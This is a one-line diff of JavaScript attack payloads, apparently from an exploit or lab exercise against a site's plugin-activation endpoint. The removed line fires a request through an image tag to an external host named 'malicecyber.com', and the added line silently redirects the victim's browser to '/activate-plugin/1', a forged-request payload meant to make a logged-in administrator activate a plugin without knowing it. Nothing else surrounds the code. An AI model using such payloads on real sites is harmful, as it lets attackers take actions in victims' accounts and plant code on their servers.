@@ -1,1 +1,1 @@
-var connard=new Image;connard.src="https://website-tfcsvj.inst.malicecyber.com/activate-plugin/1"
+location.href = '/activate-plugin/1';
